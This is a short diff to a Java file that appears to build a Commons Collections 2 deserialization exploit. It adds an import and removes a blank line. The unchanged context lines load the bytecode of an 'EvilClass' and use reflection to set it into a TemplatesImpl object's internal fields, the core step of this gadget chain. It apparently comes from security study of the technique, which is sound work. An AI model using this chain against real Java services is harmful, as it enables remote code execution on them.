@@ -10,6 +10,7 @@ import java.io.*;
 import java.lang.reflect.Field;
 import java.nio.file.Files;
 import java.nio.file.Paths;
+import java.util.Arrays;
 import java.util.PriorityQueue;
 
 public class CC2_TemplatesImpl {
@@ -25,7 +26,6 @@ public class CC2_TemplatesImpl {
         TemplatesImpl templates = new TemplatesImpl();
         //读取 EvilClass.class 文件
         byte[] evilBytes = Files.readAllBytes(Paths.get( System.getProperty("user.dir")+"\\commons-collections\\CommonsCollections2/src/main/java/EvilClass.class"));
-
         // 反射设置字段
         setFieldValue(templates, "_name", "EvilClass");
         setFieldValue(templates, "_bytecodes", new byte[][] {evilBytes});
